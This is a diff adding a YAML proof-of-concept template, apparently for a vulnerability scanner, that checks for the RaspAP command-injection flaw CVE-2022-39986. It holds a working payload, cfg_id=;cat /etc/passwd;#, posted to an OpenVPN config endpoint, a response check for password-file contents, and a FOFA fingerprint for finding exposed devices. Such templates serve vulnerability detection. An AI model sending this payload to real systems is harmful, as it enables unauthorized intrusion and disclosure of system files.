@@ -1,0 +1,27 @@
+id: poc-yaml-raspap-command-injection
+info:
+  name: Raspap 命令注入漏洞(CVE-2022-39986)
+  severity: critical
+  tags:
+  - 两高一弱
+  - 命令注入
+  - CVE-2022-39986
+  finger: raspap
+  fofa: icon_hash:-1465760059
+requests:
+- method: POST
+  path: /ajax/openvpn/del_ovpncfg.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cfg_id=;cat /etc/passwd;#
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
